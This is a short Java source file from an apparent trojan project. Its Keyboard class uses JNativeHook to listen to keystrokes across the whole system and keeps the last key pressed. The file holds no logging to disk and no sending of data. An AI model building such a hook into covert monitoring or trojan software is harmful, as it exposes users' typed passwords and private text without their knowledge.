package dev.px.trojan.Util.System;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keyboard implements NativeKeyListener {

    public String getLastKey;
    public String getLastWord;

    public Keyboard() {
        this.getLastKey = ""; // defaults to blank
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        this.getLastKey = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    public static class KeyCode {
        int keyCode;

        public KeyCode(int keyCode) {
            this.keyCode = keyCode;
        }

        public int getKeyCode() {
            return keyCode;
        }

        public void setKeyCode(int keyCode) {
            this.keyCode = keyCode;
        }
    }
}
